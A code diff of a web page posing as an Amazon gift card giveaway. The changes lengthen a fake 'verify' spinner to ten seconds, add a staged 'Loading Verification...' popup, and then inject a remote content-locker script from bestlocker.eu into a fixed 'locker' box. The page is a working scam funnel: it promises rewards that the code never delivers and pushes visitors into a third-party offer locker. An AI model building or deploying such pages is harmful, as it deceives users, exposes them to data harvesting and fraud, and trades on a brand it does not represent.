@@ -10,34 +10,34 @@
       font-family: Arial, sans-serif;
       background: #111;
       overflow-x: hidden;
-      height: 100vh;
       color: #fff;
     }
 
     .container {
-      position: relative;
       text-align: center;
       padding: 40px 20px;
       z-index: 2;
+      position: relative;
     }
 
     /* Typewriter Headline */
     h1 {
       font-size: 2rem;
+      color: #fff;
       margin-bottom: 30px;
+      text-shadow: 0 0 15px #ff9900;
       white-space: nowrap;
       overflow: hidden;
       border-right: 3px solid #ff9900;
-      width: 25ch; /* text length */
-      color: #fff;
-      text-shadow: 0 0 15px #ff9900;
-      animation: typing 4s steps(25), blink .75s step-end infinite alternate;
+      width: 0;
+      animation: typing 4s steps(30, end) forwards, blink 0.8s infinite;
     }
     @keyframes typing {
-      from { width: 0 }
+      from { width: 0; }
+      to { width: 100%; }
     }
     @keyframes blink {
-      50% { border-color: transparent }
+      50% { border-color: transparent; }
     }
 
     /* Card Grid */
@@ -50,7 +50,6 @@
 
     /* Amazon Gift Card Style */
     .card {
-      position: relative;
       padding: 20px;
       border-radius: 20px;
       background: rgba(255,255,255,0.1);
@@ -61,7 +60,6 @@
       cursor: pointer;
     }
     .card:hover { transform: translateY(-5px); }
-
     .card h2 { font-size: 1.3rem; margin: 10px 0; color: #FF9900; }
     .card p { font-size: 1rem; color: #fff; }
 
@@ -82,22 +80,18 @@
     }
     .verify-btn:hover { background: #e68a00; }
 
-    /* Loading Spinner */
+    /* Spinner */
     .loading {
       border: 3px solid #f3f3f3;
       border-top: 3px solid #FF9900;
       border-radius: 50%;
-      width: 20px;
-      height: 20px;
+      width: 20px; height: 20px;
       animation: spin 1s linear infinite;
       display: inline-block;
       vertical-align: middle;
       margin-right: 8px;
     }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
+    @keyframes spin { 0% { transform: rotate(0deg);} 100% {transform: rotate(360deg);} }
 
     /* Popup Glassmorphism */
     .popup {
@@ -123,6 +117,7 @@
       box-shadow: 0 0 25px rgba(255,153,0,0.5);
       color: #fff;
       text-align: center;
+      overflow: hidden;
     }
     .close-btn {
       position: absolute;
@@ -134,22 +129,25 @@
       text-shadow: 0 0 10px #ff9900;
     }
 
-    /* Glowing Animated Text */
-    .glow-text {
-      font-size: 1.2rem;
-      font-weight: bold;
-      background: linear-gradient(90deg, #ff9900, #ff00ff, #00ffff, #ff9900);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-size: 300%;
-      animation: glow-move 3s linear infinite;
-      text-shadow: 0 0 15px rgba(255,153,0,0.6);
-      margin-top: 10px;
+    /* Locker container (fixed size) */
+    #verify-box {
+      width: 100%;
+      height: 500px;
+      overflow-y: auto;
+      border-radius: 15px;
+      background: rgba(0,0,0,0.2);
     }
-    @keyframes glow-move {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
+
+    /* Glowing loader in popup */
+    .popup-loader {
+      font-size: 1.2rem;
+      color: #ff9900;
+      text-shadow: 0 0 10px #ff00ff, 0 0 20px #00ffff;
+      animation: glow 1s infinite alternate;
+    }
+    @keyframes glow {
+      from { text-shadow: 0 0 10px #ff9900, 0 0 20px #ff00ff; }
+      to { text-shadow: 0 0 20px #00ffff, 0 0 30px #ff9900; }
     }
 
     /* Snow / Paper / Fire Particles */
@@ -194,12 +192,13 @@
   <div id="verifyPopup" class="popup">
     <div class="popup-content">
       <span class="close-btn">&times;</span>
-      <div id="verify-box"></div>
+      <div id="popup-loading" class="popup-loader">⏳ Loading Verification...</div>
+      <div id="verify-box" style="display:none;"></div>
     </div>
   </div>
 
   <script>
-    // Button Click Loading
+    // Verify button → 10s spinner → open popup
     function startVerification(btn) {
       btn.disabled = true;
       let originalText = btn.innerHTML;
@@ -209,64 +208,55 @@
         btn.innerHTML = originalText;
         btn.disabled = false;
         openVerifyPopup();
-      }, 2000); // 2 sec loading
+      }, 10000); // 10s
     }
 
-    // Popup Loading + Locker Delay
+    // Open popup → show loader 3s → then inject locker
     function openVerifyPopup() {
       document.getElementById("verifyPopup").style.display = "block";
-      document.getElementById("verify-box").innerHTML = `
-        <div class="popup-loading">
-          <div class="loading"></div>
-          <p class="glow-text">Loading Verification...</p>
-        </div>
-      `;
+      document.getElementById("popup-loading").style.display = "block";
+      document.getElementById("verify-box").style.display = "none";
+      document.getElementById("verify-box").innerHTML = "";
 
-      // 3 sec delay before locker load
       setTimeout(() => {
-        document.getElementById("verify-box").innerHTML = "";
+        document.getElementById("popup-loading").style.display = "none";
+        document.getElementById("verify-box").style.display = "block";
+
         var s = document.createElement("script");
         s.type = "text/javascript";
         s.src = "https://bestlocker.eu/iframeLoader/9c03b476-84b9-11f0-948d-8a5fb7be40ea";
         document.getElementById("verify-box").appendChild(s);
-      }, 3000);
+      }, 3000); // 3s popup loader
     }
 
-    // Close Popup
+    // Close popup
     document.querySelector(".close-btn").onclick = () => {
       document.getElementById("verifyPopup").style.display = "none";
       document.getElementById("verify-box").innerHTML = "";
     };
 
-    // Generate Snow + Paper + Fire Particles
+    // Particles: Snow + Paper + Fire
     function createParticle(type) {
       const p = document.createElement("div");
       p.classList.add("particle");
-
       if (type === "snow") {
         p.style.background = "white";
         p.style.width = p.style.height = Math.random()*5+3 + "px";
         p.style.animationDuration = Math.random()*5+5 + "s";
-      } 
-      else if (type === "paper") {
-        p.style.width = "10px";
-        p.style.height = "14px";
+      } else if (type === "paper") {
+        p.style.width = "10px"; p.style.height = "14px";
         p.style.background = "#f5deb3";
         p.style.animationDuration = Math.random()*6+6 + "s";
-      } 
-      else if (type === "fire") {
+      } else if (type === "fire") {
         p.style.background = "orange";
         p.style.width = p.style.height = Math.random()*4+2 + "px";
         p.style.boxShadow = "0 0 10px red";
         p.style.animationDuration = Math.random()*3+3 + "s";
       }
-
       p.style.left = Math.random()*100 + "vw";
       document.body.appendChild(p);
-
       setTimeout(()=> p.remove(), 12000);
     }
-
     setInterval(()=> createParticle("snow"), 500);
     setInterval(()=> createParticle("paper"), 1200);
     setInterval(()=> createParticle("fire"), 800);
